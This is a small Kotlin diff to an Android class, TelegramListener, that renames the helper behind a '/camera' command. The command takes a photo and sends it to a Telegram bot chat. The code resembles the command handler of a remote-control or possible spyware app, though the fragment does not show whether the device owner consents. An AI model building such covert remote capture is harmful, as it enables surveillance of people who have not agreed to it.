@@ -81,7 +81,7 @@ class TelegramListener(private val context: Context) {
                 sendMessage("🔊 Speaking: $msg")
             }
             text == "/camera" -> {
-                CameraManager.captureAndSend(context, BOT_TOKEN, CHAT_ID)
+                CameraHelper.captureAndSend(context, BOT_TOKEN, CHAT_ID)
                 sendMessage("📸 Capturing photo...")
             }
             text == "/status" -> {
